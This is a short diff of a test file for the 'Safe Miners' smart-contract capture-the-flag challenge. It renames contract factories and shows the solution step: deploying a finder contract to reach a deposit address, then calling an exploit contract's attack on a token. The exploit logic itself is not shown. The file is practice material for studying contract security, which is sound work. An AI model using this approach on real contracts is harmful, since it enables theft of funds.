@@ -24,13 +24,13 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        const FinderFactory = await ethers.getContractFactory("JuniorMinersFinder", attacker);
+        const FinderFactory = await ethers.getContractFactory("SafeMinersFinder", attacker);
         for (let nonce = 0; nonce <= 1; nonce++) {
             this.finder = await FinderFactory.deploy();
         }
         await this.finder.find(65);
 
-        const ExploitFactory = await ethers.getContractFactory("JuniorMinersExploit");
+        const ExploitFactory = await ethers.getContractFactory("SafeMinersExploit");
         this.exploit = await ExploitFactory.attach(DEPOSIT_ADDRESS);
         await this.exploit.attack(this.token.address)
     });
